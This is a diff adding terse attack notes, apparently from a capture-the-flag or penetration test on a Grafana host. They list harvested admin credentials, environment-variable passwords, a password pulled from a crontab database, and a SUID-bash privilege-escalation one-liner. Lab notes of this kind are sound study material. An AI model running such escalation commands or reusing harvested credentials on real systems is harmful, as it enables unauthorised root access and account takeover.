@@ -1,0 +1,23 @@
+admin / 0D5oT70Fq13EvB5r
+grafana vhost
+CVE to RCE
+
+
+public/app/features/invites/SignupInvited.test.tsx:        password: 'pass@word1',
+public/app/plugins/datasource/prometheus/datasource.test.ts:      password: 'mupp',
+
+env variables:
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+AWS_AUTH_SESSION_DURATION=15m
+GF_SECURITY_ADMIN_USER=enzo
+
+
+
+/opt/crontabs/crontab.db:
+password: P4ssw0rdS0pRi0T3c
+
+access the webpage on port 8000 and log in
+
+then create a script to escalate adn run it like:
+
+cp /bin/bash /tmp/escalate; chmod +s /tmp/escalate
